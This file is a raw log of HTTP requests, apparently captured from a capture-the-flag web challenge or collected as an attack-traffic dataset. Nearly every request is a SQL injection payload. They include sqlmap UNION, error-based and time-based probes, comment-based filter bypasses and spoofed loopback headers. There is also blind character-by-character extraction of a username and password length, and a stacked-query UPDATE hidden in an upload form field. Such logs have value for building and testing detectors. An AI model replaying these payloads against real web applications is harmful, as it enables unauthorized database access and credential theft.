Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-3711%27%29%20AS%20LkMo%20WHERE%206654%3D6654%20OR%209184%3D4808--%20tEfP HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1&password=123456%22%2F%2A%2A%2FAND%2F%2A%2A%2F4087%3D4087%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=p HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: -8450"" UNION ALL SELECT 9295,9295,9295,9295,9295,9295#
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1&password=123456%27%29%2F%2A%2A%2FAS%2F%2A%2A%2FWwyX%2F%2A%2A%2FWHERE%2F%2A%2A%2F9729%3D9729%2F%2A%2A%2FAND%2F%2A%2A%2F4087%3D4087%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_broken_flag.php?userid=1/**/or/**/1&password=broken_flag HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 20

password=broken_flag"
"/seArch_For_ONe_flag.php?userid=1%27%29%29%20OR%20NOT%201671%3D1125%20AND%20%28%28%27VFlk%27%3D%27VFlk HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-7623%22%29%29%29%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%204371%2C4371%2C4371%2C4371%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=65953/**/or/**/1=1-- HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

"
"/seArch_For_ONe_flag.php?userid=-5485%22%29%29%29%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%207329%2C7329%2C7329%2C7329%2C7329%2C7329%2C7329%2C7329%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=p HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.8#pip (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1&password=123456%27%29%2F%2A%2A%2FAND%2F%2A%2A%2FMAKE_SET%289656%3D9656%2C6836%29--%2F%2A%2A%2FMzfk HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=65953/**/or/**/1=0-- HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

"
"/seArch_For_ONe_flag.php?userid=1%22%29%29%29%20AND%207829%3D7829--%20xWcP HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'_______' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'____' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=1&password=123456%27%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287559%3D7559%29%2A3945%2F%2A%2A%2FAND%2F%2A%2A%2F%28%28%27SATD%27%3D%27SATD HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1&password=123456%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FYLiN%2F%2A%2A%2FWHERE%2F%2A%2A%2F1150%3D1150%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%283358%3D9848%29%2F%2A%2A%2FTHEN%2F%2A%2A%2FNULL%2F%2A%2A%2FELSE%2F%2A%2A%2FCAST%28%28CHR%2867%29%7C%7CCHR%2872%29%7C%7CCHR%28101%29%7C%7CCHR%2865%29%29%2F%2A%2A%2FAS%2F%2A%2A%2FNUMERIC%29%2F%2A%2A%2FEND%29%29%2F%2A%2A%2FIS%2F%2A%2A%2FNULL--%2F%2A%2A%2FboAx HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?password=1%20AND%20%28SELECT%206714%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x717a786b71%2C%28SELECT%20%28ELT%286714%3D6714%2C1%29%29%29%2C0x71707a7171%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29--%20CMNS HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5.6#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?password=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20zsPT HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5.6#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=p HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.8#pip (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1&userid=1/**/or%05der/**/by/**/4 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=-9337%29%20OR%204461%3D1361%16 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1&userid=1/**/or%05der/**/by/**/4 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=p HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.8#pip (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1&password=123456 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%20AND%201299%3DCAST%28%28CHR%28113%29%7C%7CCHR%28113%29%7C%7CCHR%28112%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%281299%3D1299%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%20AND%20%27SruN%27%3D%27SruN HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.10#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=65953&password=1'^(ascii(mid((password)from(0)))>200) HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20MnpH HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.10#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=p HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.2.8#pip (http://sqlmap.org)
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20dtWa HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.8.10#dev (http://sqlmap.org)
Connection: close
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1%22%29%29%20RLIKE%20%28SELECT%20%28CASE%20WHEN%20%286468%3D6468%29%20THEN%201%20ELSE%200x28%20END%29%29%20AND%20%28%28%22yvdh%22%3D%22yvdh HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=-4571%22%29%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2F3615%2C3615%2C3615%2C3615%2C3615%2C3615%2C3615%23&password=U HTTP/1.1
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: sqlmap/1.0.4.0#dev (http://sqlmap.org)
Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
Connection: close
Pragma: no-cache
Cache-Control: no-cache,no-store

"
"/seArch_For_ONe_flag.php?userid=1%22%20WHERE%205936%3D5936%20AND%209465%3DCTXSYS.DRITHSX.SN%289465%2C%28CHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28122%29%7C%7CCHR%28106%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%289465%3D9465%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%29--%20gFUX HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=4%20*%20order%20by%200&password=%27or%27=%27or%27 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%0A%7C%7C%0A1%22%29%29%2F%2A%210AS%20cxrS%2F%2A%210WHERE%208227%3D8227%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL%2C%2F%2A%210NULL%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%22%29%20AND%204191%3D4191%20AND%20%28%22FEIr%22%20LIKE%20%22FEIr HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%27%20WHERE%201917%3D1917%20AND%204191%3D4191--%20ZabU HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=p HTTP/1.1
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: -8893' UNION ALL SELECT 3748,3748,3748,3748,3748#
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=65953%27or/**/1=1-- HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8

"
"/seArch_For_ONe_flag.php?userid=-9509%27%2F%2A%210UNION%2F%2A%210ALL%2F%2A%210SELECT%207189%2C7189%2C7189%2C7189%23 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1&password=123456%22%2F%2A%2A%2FAND%2F%2A%2A%2F2450%3D2450%2F%2A%2A%2FAND%2F%2A%2A%2F%22TDqY%22%2F%2A%2A%2FLIKE%2F%2A%2A%2F%22TDqY HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'________________________' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'_________________________' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'_____________________________' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=02/**/or/**/1=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
X-Forwarded-For: 127.0.0.1
Client-IP: 127.0.0.1
x-remote-IP: 127.0.0.1
x-originating-IP: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1

"
"/seArch_For_ONe_flag.php?userid=1%27%3BSELECT%20PG_SLEEP%285%29--%20YIgZ HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%22%29%29%29%3BSELECT%20PG_SLEEP%285%29%20AND%20%28%28%28%22OCcp%22%20LIKE%20%22OCcp HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.29#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%0A%7C%7C%0A1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1&userid=1/**/or%0a%0dder/**/by/**/4 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'____________________________________' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=22/**/or/**/1=1 HTTP/1.1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

"
"/seArch_For_ONe_flag.php?userid=1%0A%7C%7C%0A1 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.5#stable (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1%29%29%20AND%20%284148%3D1636%29%2A1636%20AND%20%28%288123%3D8123 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.9.26#dev (http://sqlmap.org)
Connection: close

"
"/seArch_For_ONe_flag.php?userid=1/**/or/**/password/**/like/**/'_______________________________________' HTTP/1.1
User-Agent: python-requests/2.19.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive

"
"/f1ag0753.html HTTP/1.1
cache-control: no-cache
Postman-Token: f801dfed-1ef6-4876-9266-f4ed405f929a
User-Agent: PostmanRuntime/7.3.0
Accept: */*
accept-encoding: gzip, deflate
referer: http://58.20.46.151:20745/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/%27%5Ewang%27
Connection: keep-alive

"
"/index.php?r=users%2Ffile HTTP/1.1
Accept-Encoding: identity
Content-Length: 979
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:52.0) Gecko/20100101 Firefox/52.0
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1902429811253813294937509316

-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""_csrf""

ZMYrbBmdqXOH_JcWXTama2dyI1k1qcpxtBhVUZg0gZIcsUMmW_n4RuTO9l0vAvYEMihkIwT6lSH3fD8EqHzCxw==
-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""UploadForm[name]""

111';UPDATE sqlmapfile SET data=CONCAT(data,0x0e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d000000)#
-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""UploadForm[imageFile]""


-----------------------------1902429811253813294937509316
Content-Disposition: form-data; name=""UploadForm[imageFile]""; filename=""1.png""
Content-Type: image/png

1111

-----------------------------1902429811253813294937509316--"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa1' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa2' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa3' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa6' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa7' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewah' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewaj' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewap' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewaw' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa%7D' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewa_' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/%2A%2A/%26%26/%2A%2A/user_name/%2A%2A/REGEXP/%2A%2A/%27%5Ewangqin%27 HTTP/1.1
cache-control: no-cache
Postman-Token: 516ec7b1-42c3-4f14-8a4a-2b9dff92ea72
User-Agent: PostmanRuntime/7.3.0
Accept: */*
accept-encoding: gzip, deflate
Connection: keep-alive

"
"/seArch_For_ONe_flag.php?userid=1%27 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
User-Agent: sqlmap/1.2.7.20#dev (http://sqlmap.org)"") AS dzMv WHERE 8707=8707 AND 6495=CONCAT(CHAR(113)+CHAR(120)+CHAR(107)+CHAR(98)+CHAR(113),(SELECT (CASE WHEN (6495=6495) THEN CHAR(49) ELSE CHAR(48) END)),CHAR(113)+CHAR(113)+CHAR(113)+CHAR(122)+CHAR(113))-- fWst
Connection: close

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewang0' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewang1' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewang5' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewang7' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewange' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewangf' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewangj' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewangq' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewangt' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewangu' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewangz' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=3/**/%26%26/**/user_name/**/REGEXP/**/'%5Ewang_' HTTP/1.1
User-Agent: Wget/1.15 (linux-gnu)
Accept: */*
Connection: Keep-Alive

"
"/seArch_For_ONe_flag.php?userid=1%27 HTTP/1.1
Accept-Encoding: gzip,deflate
Accept: */*
